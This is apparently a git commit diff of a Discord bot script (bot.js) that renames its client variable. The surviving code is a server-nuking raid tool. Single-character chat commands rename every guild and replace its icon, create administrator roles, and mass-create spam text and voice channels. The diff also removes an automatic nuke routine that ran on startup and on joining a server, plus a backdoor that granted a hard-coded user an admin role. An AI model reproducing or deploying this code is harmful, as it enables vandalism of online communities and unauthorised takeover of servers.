86a2c57b8d3f44b27cb0155fc5aa5bec30b0c5d2
wented6 <44713416+wented6@users.noreply.github.com>
2019-03-29 12:10:17 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,72 +1,72 @@
 const Discord = require("discord.js");
-const LOka = new Discord.Client();
+const Client = new Discord.Client();
 console.log('Edited. By; MeeRcY');
-LOka.on('ready', () => {
-  console.log(`->  ${LOka.user.tag} !`);
+Client.on('ready', () => {
+  console.log(`->  ${Client.user.tag} !`);
  
 });
-LOka.on('ready',  () => {
+Client.on('ready',  () => {
 console.log(' - So bad.     ');
 console.log('');
 console.log('   i LOVE @plat ..   ');
 console.log('');
 console.log('   SO TRUE -      ');
-console.log(`       S. > " ${LOka.guilds.size} " <  ||  M. > " ${LOka.users.size} " <                                        ||                 `);
+console.log(`       S. > " ${Client.guilds.size} " <  ||  M. > " ${Client.users.size} " <                                        ||                 `);
  
        
    
  
 });
 var prefix = "1"
-LOka.on("message", message => {
+Client.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split("1").slice(1);
   var argresult = args.join('1');
   if (message.content.startsWith('1')) {
-    LOka.user.setUsername(argresult);
+    Client.user.setUsername(argresult);
   }
     if (message.content.startsWith(prefix + '1')) {
-    LOka.user.setStatus(argresult);
+    Client.user.setStatus(argresult);
   }
 });
  
 var x1 = "1"
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/355815652386275338/484901140790640659/438.jpg`)
+Client.user.setAvatar(`https://cdn.discordapp.com/attachments/355815652386275338/484901140790640659/438.jpg`)
  
 }
 });
 var x1 = "1"
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
-LOka.user.setUsername("' Asssit,#0100")
+Client.user.setUsername("' Asssit,#0100")
  
 }
 });
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
-LOka.user.setGame(`Ouut.`,'https://www.twitch.tv/MeeRcY')
+Client.user.setGame(`Ouut.`,'https://www.twitch.tv/MeeRcY')
  
 }
 });
  
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
-         LOka.guilds.forEach(m =>{
+         Client.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/359013848151490572/527822471530020876/unknown.png`)
 })
 }
 });
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
-         LOka.guilds.forEach(m =>{
+         Client.guilds.forEach(m =>{
              m.setName(`Out.`)
 })
 }
 });
  
-LOka.on('message', message => {
+Client.on('message', message => {
      if (message.content === "1") {
                  if(!message.channel.guild) return;
  
@@ -75,11 +75,11 @@ LOka.on('message', message => {
 }
 });
  
-LOka.on('message', message => {
+Client.on('message', message => {
      
  
      if (message.content === "2") {
-         LOka.guilds.forEach(m =>{
+         Client.guilds.forEach(m =>{
   m.createRole({
         name : "",
         permissions :   [8],
@@ -1394,9 +1394,9 @@ LOka.on('message', message => {
  
 }
 });
-LOka.on('message', message => {
+Client.on('message', message => {
          if (message.content === "3") {
-               LOka.guilds.forEach(m =>{
+               Client.guilds.forEach(m =>{
 m.createChannel('By : Asssit - Gn', 'text');
 m.createChannel('By : Asssit - Gn', 'text');
 m.createChannel('By : Asssit - Gn', 'text');
@@ -1482,9 +1482,9 @@ m.createChannel('By : Asssit - Gn', 'text');
 }
 });
  
-LOka.on('message', message => {
+Client.on('message', message => {
          if (message.content === "4") {
-                 LOka.guilds.forEach(m =>{
+                 Client.guilds.forEach(m =>{
 m.createChannel('By : Asssit - Gn', 'voice');
 m.createChannel('By : Asssit - Gn', 'voice');
 m.createChannel('By : Asssit - Gn', 'voice');
@@ -5659,41 +5659,9 @@ m.createChannel('By : Asssit - Gn', 'voice');
  
 
  
- 
- 
-}
- 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('     ');
-  console.log("  Nah. that was EASY.");
-  console.log("     @FuckTheWorld.       ");
-  console.log("    ");
- 
-});
- 
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
- 
-LOka.on('guildMemberAdd', member => {
-   
-            if (member.id === "320423357709549568") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
- 
    
  
  
  
  
-LOka.login(process.env.B)
+Client.login(process.env.B)
